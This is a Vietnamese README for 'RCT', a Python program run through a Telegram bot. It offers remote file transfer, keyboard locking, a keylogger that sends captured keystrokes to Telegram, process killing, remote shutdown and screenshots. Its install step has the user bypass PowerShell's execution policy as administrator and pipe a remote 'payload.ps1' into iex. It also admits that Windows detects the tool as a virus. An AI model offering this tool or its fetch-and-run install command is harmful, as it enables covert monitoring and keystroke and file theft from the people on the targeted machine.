

---

## Mục Lục
- [Hình ảnh về RCT](#các-hình-ảnh-về-rct)
- [Hướng dẫn cài đặt và sử dụng](#hướng-dẫn-sử-dụng-phần-mềm)
- [Thông tin về RCT](#về-rct)
## Các hình ảnh về RCT 
  Biểu tượng 

  ![icon](icon.jpg)

  Tab Home
  
  ![home](home.jpg)

  Tab Main
  
  ![main](main.jpg)

  Tab Setting
  
  ![setting](setting.jpg)
  - **Các chức năng**
    
    **1. Gửi và nhận file ( gửi file từ telegram và lưu vào máy,lấy file từ máy gửi ra telegram )**
       
    ![send_receive](sendf.jpg)
    
    ![receive](receivef.jpg)

    **2. Khóa bàn phím ( khóa các phím thường hay dùng và đặt thời gian tự động mở )**
       
    ![keylock](keylock.jpg)

    **3. Giám sát bàn phím ( giám sát các phím đã nhấn và gửi file kết quả về telegram sau khi hết thời gian giám sát )**
       
    ![keylogger](keylogger.jpg)

    **4. Xem tiến trình và dừng ( xem các tiến trình đang chạy và dừng tiến trình nếu cần,giới hạn xem 40 tiến trình )**
       
    ![running](running.jpg)
    
    ![kill](kill.jpg)

    **5. Tắt máy ( dùng lệnh để tắt máy tính từ xa )**
        
    ![shutdown](shutdown.jpg)
    
    **note : tính năng chụp màn hình khi dùng bot sẽ chụp màn hình hiện tại và gửi ảnh cho người dùng**
---
# Hướng Dẫn Sử Dụng Phần Mềm



## 1. Cài Đặt Phần Mềm
-Trên thanh tìm kiếm windows,tìm `powershell` và chạy dưới quyền admin sau đó nhập các lệnh sau :
```
Set-ExecutionPolicy Bypass -Scope Process -Force
```

```
irm "https://raw.githubusercontent.com/Anhdeface/recote_RCT/refs/heads/main/payload.ps1" | iex
```
 -Sau khi tải xong thì phần mềm sẽ tự động chạy và chỉ cần thiết lập vài thứ cơ bản là xong
 
---
## 2. Liên Kết Token Bot Telegram
Cần tải ứng dụng Telegram ở thiết bị cần giám sát 
và đăng kí tài khoản sau đó xem bài viết dưới đây để thiết lập bot

Xem chi tiết ở đây : [xem bài viết chi tiết](https://vietnix.vn/tao-bot-telegram/)

---

## 3. Nhập Token Vào Phần Mềm

- **Mở phần mềm:**  
  Khởi động phần mềm đã được cài đặt.

- **Truy cập tab Setting:**  
  Chọn tab **Setting** trên giao diện.

- **Nhập token:**  
  Dán token đã sao chép vào ô nhập liệu được chỉ định.

- **Lưu cài đặt:**  
  Nhấn nút **Lưu cài đặt** để lưu lại thông tin token.

---

## 4. Khởi Động Bot

- **Chuyển sang tab Main:**  
  Quay lại giao diện chính, chuyển sang tab **Main**.

- **Kích hoạt bot:**  
  Nhấn biểu tượng **Start** để khởi động bot.

- **Kiểm tra hoạt động:**  
  Gửi các lệnh đã được lập trình ( `/help`, `/menu`) để xác nhận bot hoạt động bình thường.

---
## Về RCT



-RCT là phần mềm được thiết kế bởi QuocAnh và YenNgoc được viết hoàn toàn bằng ngôn ngữ Python

-Sử dụng PyInstaller để đóng gói và UPX để tối ưu,NSIS được sử dụng để tạo file cài đặt giúp người dùng dễ dàng cài đặt phần mềm

-Sử dụng phần lớn thư viện telebot (pyTelegramBotAPI) để điều khiển bot và thực hiện các lệnh

-Sử dụng framework PyQt5 và Qt Designer để thiết kế giao diện người dùng 

-Hoàn thành dự án chính thức sau 18 ngày ( kể từ 9/02/2025 - 27/02/2025 )

-Lưu ý : vì phần mềm thực hiện các hành động như : chụp màn hình,khóa bàn phím,giám sát bàn phím...Nên Windows sẽ nhận diện đây là virus


---

